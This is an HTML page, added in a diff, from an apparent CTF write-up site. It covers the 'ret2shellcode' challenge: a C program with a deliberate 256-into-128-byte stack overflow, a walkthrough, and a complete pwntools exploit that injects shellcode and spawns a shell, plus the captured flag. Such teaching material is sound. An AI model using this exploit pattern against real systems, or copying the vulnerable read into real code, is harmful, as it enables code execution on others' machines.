@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ret2shellcode // Rogue_Net</title>
+    <meta name="description" content="## ret2shellcode ## Description NX is off — the stack is executable. Inject your shellcode, find the buffer address, and redirect execution straight i">
+    <link rel="stylesheet" href="../../../static/css/style.css">
+</head>
+<body>
+    <!-- Genjutsu Transition Overlay -->
+    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
+        <div class="eyelid eyelid-top"></div>
+        <div class="eyelid eyelid-bottom"></div>
+        <div class="genjutsu-eye">
+                <svg viewBox="0 0 200 200">
+                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
+                    <!-- Base 3-Tomoe -->
+                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
+                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
+                        <circle cx="100" cy="100" r="16" fill="#000"/>
+                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
+                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                    </g>
+                    <!-- Uploaded Image Mangekyo -->
+                    <defs>
+                        <clipPath id="circleClip">
+                            <circle cx="100" cy="100" r="98" />
+                        </clipPath>
+                    </defs>
+                    <image href="../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
+                </svg>
+        </div>
+    </div>
+    <div class="scanlines"></div>
+    <div class="scroll-indicator" id="scrollIndicator"></div>
+    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
+    <div class="pwndbg-bg" id="pwndbgBg"></div>
+
+    <div class="container" style="gap: 40px;">
+
+        <a href="../../../index.html" class="back-link">← pwndbg> back</a>
+
+        <div class="chall-header">
+            <h1><span class="prefix">./</span>ret2shellcode<span class="cursor-blink">_</span></h1>
+            <div class="chall-meta-row">
+                <span class="tag">PWN</span>
+                <span>FST Bootcamp</span>
+                <span>0x7afb1997</span>
+                
+                
+                <span>
+                    <span class="difficulty">
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                    </span>
+                </span>
+            </div>
+        </div>
+
+        <!-- Description -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DESCRIPTION</div>
+            <div class="code-block">
+                ## ret2shellcode ## Description NX is off — the stack is executable. Inject your shellcode, find the buffer address, and redirect execution straight into your payload. Raw shellcode injection at its finest.
+            </div>
+        </div>
+
+        
+        <!-- Source Code / Disasm -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DISASM // SOURCE</div>
+            
+            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// main.c</div>
+            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    char buf[128];
+    printf(&#34;Hey, hacker! here is a small gift for u: %p\n&#34;, buf);
+    printf(&#34;Spill your guts: &#34;);
+    fflush(stdout);
+    read(0, buf, 256);
+    printf(&#34;Thanks for the input! Exiting gracefully...\n&#34;);
+    return 0;
+}</pre>
+            </div>
+            
+        </div>
+        
+
+        
+        <!-- Writeup -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
+            <div class="writeup-content">
+                <h1>ret2shellcode — Writeup</h1>
+<h2>Challenge Overview</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>PWN</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Easy</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td>R3t0x</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Return to Shellcode</td>
+</tr>
+</tbody>
+</table>
+<h2>Reconnaissance</h2>
+<div class="codehilite"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>checksec<span class="w"> </span>./main
+<span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
+<span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
+<span class="w">    </span>Stack:<span class="w">    </span>No<span class="w"> </span>canary<span class="w"> </span>found
+<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>disabled
+<span class="w">    </span>PIE:<span class="w">      </span>No<span class="w"> </span>PIE
+</code></pre></div>
+
+<p><strong>NX is disabled</strong> — the stack is executable! The binary also prints the buffer address:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hey, hacker! here is a small gift for u: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span>
+<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">256</span><span class="p">);</span><span class="w">  </span><span class="c1">// 256 bytes into 128-byte buffer</span>
+</code></pre></div>
+
+<h2>Strategy</h2>
+<ol>
+<li>Parse the leaked buffer address</li>
+<li>Place shellcode in the buffer</li>
+<li>Overflow RIP to point back to the buffer address</li>
+</ol>
+<div class="codehilite"><pre><span></span><code><span class="n">buf_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0x&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">136</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
+</code></pre></div>
+
+<h2>Result</h2>
+<div class="codehilite"><pre><span></span><code>Hey, hacker! here is a small gift for u: 0x7fffffffdc70
+$ cat flag.txt
+FST{r3t2sh3llc0d3_cl4ss1c}
+</code></pre></div>
+            </div>
+        </div>
+        
+
+        
+        <!-- Exploit / Solver -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
+            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
+                <span style="color: var(--gdb-green);">$</span> python3 solve.py
+            </div>
+            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">#!/usr/bin/env python3
+from pwn import *
+
+# Set up the context
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+
+#p = process(&#39;./main&#39;)
+p=remote(&#34;localhost&#34;,7007)
+p.recvuntil(b&#39;here is a small gift for u: &#39;)
+buffer_addr = int(p.recvline().strip(), 16)
+log.info(f&#34;Buffer address: {hex(buffer_addr)}&#34;)
+
+shellcode = asm(shellcraft.sh())
+log.info(f&#34;Shellcode length: {len(shellcode)} bytes&#34;)
+
+# Build the payload
+offset = 136 
+payload = b&#39;&#39;
+payload += shellcode  
+payload += b&#39;A&#39; * (offset - len(shellcode))  
+payload += p64(buffer_addr)  
+
+# Send the payload
+p.sendlineafter(b&#39;Spill your guts: &#39;, payload)
+
+# Interact with the shell
+log.success(&#34;Exploit sent! Dropping to shell...&#34;)
+p.interactive()</pre>
+            </div>
+        </div>
+        
+
+        <div style="height: 80px;"></div>
+    </div>
+
+    <script src="../../../static/js/main.js"></script>
+</body>
+</html>
